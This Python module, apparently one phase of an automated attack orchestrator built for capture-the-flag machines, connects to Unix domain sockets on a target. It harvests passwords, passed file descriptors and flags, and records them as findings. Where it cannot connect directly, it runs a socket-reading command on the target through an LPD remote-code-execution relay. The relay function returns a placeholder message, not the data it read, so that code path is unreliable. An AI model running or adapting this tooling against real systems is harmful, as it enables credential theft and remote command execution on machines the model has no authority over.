"""
socket_scm.py — Unix socket SCM_RIGHTS/SCM_CREDENTIALS client for credential interception.

Intercepts credentials sent via Unix domain socket ancillary data (SCM_RIGHTS, SCM_CREDENTIALS)
from services like paperwor-daemon honeypot that deliver admin passwords via fd passing.
"""

import asyncio
import logging
import os
import socket
import struct
import time
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity

logger = logging.getLogger("phase_socket_scm")

SCM_CREDENTIALS = 0x02
SCM_RIGHTS = 0x01
SO_PASSCRED = 16

FLAG_PATTERN = __import__("re").compile(r'[a-f0-9]{32}|HTB\{[^}]+\}|flag\{[^}]+\}')

SOCKET_CANDIDATES = [
    "/var/run/paperwork-daemon.sock",
    "/var/run/paperwork.sock",
    "/tmp/paperwork-daemon.sock",
    "/tmp/paperwork.sock",
    "/run/paperwork-daemon.sock",
    "/run/paperwork.sock",
]


def recv_fds(sock: socket.socket, maxfds: int = 8, bufsize: int = 4096) -> tuple[bytes, list[int]]:
    """Receive data and any SCM_RIGHTS file descriptors."""
    fds = []
    data = b""
    try:
        data, ancdata, _, _ = sock.recvmsg(bufsize, socket.CMSG_SPACE(maxfds * 4))
        for cmsg_level, cmsg_type, cmsg_data in ancdata:
            if cmsg_level == socket.SOL_SOCKET and cmsg_type == SCM_RIGHTS:
                fd_count = len(cmsg_data) // 4
                fds = [struct.unpack_from("i", cmsg_data, i * 4)[0] for i in range(fd_count)]
    except Exception:
        try:
            data = sock.recv(bufsize)
        except Exception:
            data = b""
    return data, fds


def recv_creds(sock: socket.socket, bufsize: int = 4096) -> tuple[bytes, Optional[dict]]:
    """Receive data and SCM_CREDENTIALS (pid, uid, gid) on Linux."""
    creds = None
    data = b""
    try:
        data, ancdata, _, _ = sock.recvmsg(bufsize, socket.CMSG_SPACE(28))
        for cmsg_level, cmsg_type, cmsg_data in ancdata:
            if cmsg_level == socket.SOL_SOCKET and cmsg_type == SCM_CREDENTIALS:
                pid, uid, gid = struct.unpack_from("III", cmsg_data, 0)
                creds = {"pid": pid, "uid": uid, "gid": gid}
    except Exception:
        try:
            data = sock.recv(bufsize)
        except Exception:
            data = b""
    return data, creds


async def connect_and_intercept(path: str, timeout: float = 10.0) -> dict:
    """Connect to a Unix socket and attempt to receive credentials."""
    result = {
        "path": path,
        "connected": False,
        "data": "",
        "fds": [],
        "creds": None,
        "error": None,
    }
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(path)
        result["connected"] = True
        logger.info(f"  [Socket SCM] Connected to {path}")

        # Send a probe to trigger credential delivery
        probe = b"HELO raphael\n"
        try:
            s.send(probe)
        except OSError:
            pass

        # Receive data and ancillary fds
        data, fds = recv_fds(s)
        if data:
            result["data"] = data.decode(errors="replace").strip()
            result["fds"] = fds

        # Try to enable credentials and receive again
        try:
            s.setsockopt(socket.SOL_SOCKET, SO_PASSCRED, 1)
            s.send(b"STATUS\n")
            more_data, creds = recv_creds(s)
            if more_data:
                prev = result["data"]
                result["data"] = (prev + "\n" + more_data.decode(errors="replace")).strip()
            result["creds"] = creds
        except OSError:
            pass

        s.close()
    except FileNotFoundError:
        result["error"] = f"Socket {path} not found"
    except ConnectionRefusedError:
        result["error"] = f"Connection refused on {path}"
    except OSError as e:
        result["error"] = f"Socket error: {e}"
    except Exception as e:
        result["error"] = str(e)

    return result


async def try_intercept_on_target(target: str, socket_path: str,
                                  relay_func=None) -> dict:
    """
    Intercept credentials from a Unix socket on a remote target.
    If direct connection isn't possible, uses a relay function (e.g. LPD RCE)
    to read the socket and return data.
    """
    if relay_func:
        result = await relay_func(socket_path)
        if result:
            return {
                "path": socket_path,
                "connected": True,
                "data": result.get("data", ""),
                "fds": result.get("fds", []),
                "creds": result.get("creds"),
                "relayed": True,
                "error": None,
            }
        return {"path": socket_path, "connected": False, "relayed": True,
                "error": "Relay returned no data"}

    return await connect_and_intercept(socket_path)


async def read_socket_via_lpd(target: str, socket_path: str) -> Optional[dict]:
    """Read a Unix socket via LPD RCE and return data."""
    from orchestrator.brain.phases.lpd_exploit import _lpd_send_raw
    read_cmd = (
        f"python3 -c \"import os,socket;s=socket.socket(socket.AF_UNIX);"
        f"s.connect('{socket_path}');s.send(b'HELO\\\\n');"
        f"d=s.recv(4096);print(d.decode(errors='replace'))\" 2>/dev/null"
    )
    result = await asyncio.get_running_loop().run_in_executor(
        None, lambda: _lpd_send_raw(target, read_cmd)
    )
    if result:
        return {"data": "Command sent via LPD relay", "relayed": True}
    return None


async def run_socket_scm(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    all_findings = list(findings or [])
    errors = []

    logger.info(f"  [Socket SCM] Attempting Unix socket credential interception")

    # Check if we have LPD access for relay
    has_lpd = any(f.service == "lpd" for f in all_findings)
    relay_func = None
    if has_lpd:
        relay_func = lambda sp: read_socket_via_lpd(target, sp)

    socket_paths = SOCKET_CANDIDATES.copy()

    # Also extract socket paths from previous findings
    for f in all_findings:
        if f.type == "pjl_socket_path" and f.evidence:
            for sp in SOCKET_CANDIDATES:
                if sp in f.evidence:
                    socket_paths.append(sp)
        if f.type == "pjl_honeypot_source" and f.evidence:
            for sp in SOCKET_CANDIDATES:
                if sp in f.evidence:
                    socket_paths.append(sp)

    socket_paths = list(set(socket_paths))

    loop = asyncio.get_running_loop()
    intercepted_creds = []

    for sock_path in socket_paths:
        logger.info(f"  [Socket SCM] Trying {sock_path}...")
        result = await loop.run_in_executor(
            None, lambda sp=sock_path: asyncio.run(try_intercept_on_target(target, sp, relay_func))
        )

        if result.get("connected"):
            data = result.get("data", "")
            logger.info(f"  [Socket SCM] Connected to {sock_path} — data: {data[:100] if data else '(empty)'}")

            all_findings.append(Finding(
                phase="socket_scm", type="socket_connected", target=target,
                severity=Severity.HIGH,
                description=f"Connected to Unix socket: {sock_path}",
                evidence=f"Socket connection established, data={data[:200]}",
            ))

            if data:
                # Look for credentials in received data
                for line in data.split("\n"):
                    line = line.strip()
                    if ":" in line and len(line) < 200:
                        parts = line.split(":", 1)
                        user, pw = parts[0].strip(), parts[1].strip()
                        if pw and len(pw) < 100:
                            intercepted_creds.append({"user": user, "password": pw})
                            all_findings.append(Finding(
                                phase="socket_scm", type="credential", target=target,
                                severity=Severity.CRITICAL,
                                description=f"Credential intercepted from {sock_path}: {user}:{pw}",
                                evidence=f"Unix socket credential interception: {user}:{pw}",
                            ))

                # Check for flags in socket data
                for flag in FLAG_PATTERN.findall(data):
                    all_findings.append(Finding(
                        phase="socket_scm", type="root_flag" if "root" in data.lower() else "user_flag",
                        target=target,
                        severity=Severity.CRITICAL,
                        description=f"FLAG from socket data: {flag}",
                        evidence=data[:500],
                    ))

            if result.get("fds"):
                fds = result["fds"]
                logger.info(f"  [Socket SCM] Received {len(fds)} file descriptors")
                all_findings.append(Finding(
                    phase="socket_scm", type="scm_rights_fds", target=target,
                    severity=Severity.CRITICAL,
                    description=f"SCM_RIGHTS: received {len(fds)} file descriptors from {sock_path}",
                    evidence=f"FDs: {fds}",
                ))
                # Read data from each received fd
                for fd in fds:
                    try:
                        fd_data = b""
                        while True:
                            try:
                                chunk = os.read(fd, 4096)
                                if not chunk:
                                    break
                                fd_data += chunk
                            except BlockingIOError:
                                break
                        decoded = fd_data.decode(errors="replace").strip()
                        if decoded:
                            logger.info(f"  [Socket SCM] FD {fd} data: {decoded[:100]}")
                            for flag in FLAG_PATTERN.findall(decoded):
                                all_findings.append(Finding(
                                    phase="socket_scm", type="root_flag" if "root" in decoded.lower() else "user_flag",
                                    target=target,
                                    severity=Severity.CRITICAL,
                                    description=f"FLAG from SCM_RIGHTS fd {fd}: {flag}",
                                    evidence=decoded[:500],
                                ))
                            if ":" in decoded:
                                parts = decoded.split(":", 1)
                                user, pw = parts[0].strip(), parts[1].strip()
                                intercepted_creds.append({"user": user, "password": pw})
                                all_findings.append(Finding(
                                    phase="socket_scm", type="credential", target=target,
                                    severity=Severity.CRITICAL,
                                    description=f"Credential from SCM_RIGHTS fd: {user}:{pw}",
                                    evidence=decoded[:200],
                                ))
                        os.close(fd)
                    except OSError:
                        pass

            if result.get("creds"):
                creds = result["creds"]
                all_findings.append(Finding(
                    phase="socket_scm", type="scm_credentials", target=target,
                    severity=Severity.HIGH,
                    description=f"SCM_CREDENTIALS from socket: pid={creds['pid']} uid={creds['uid']} gid={creds['gid']}",
                    evidence=str(creds),
                ))

    if not any(f.type == "socket_connected" for f in all_findings):
        errors.append("No Unix sockets accessible or interceptable")

    latency = time.time() - t0
    new_findings = [f for f in all_findings if f.phase == "socket_scm"]

    return PhaseResult(
        phase="socket_scm",
        success=len(new_findings) > 0,
        findings=all_findings,
        summary=f"Socket SCM: {len(new_findings)} findings, {len(intercepted_creds)} credentials intercepted" +
                (f" via relay" if relay_func else " (direct)"),
        latency=latency,
        error="; ".join(errors) if errors else None,
    )
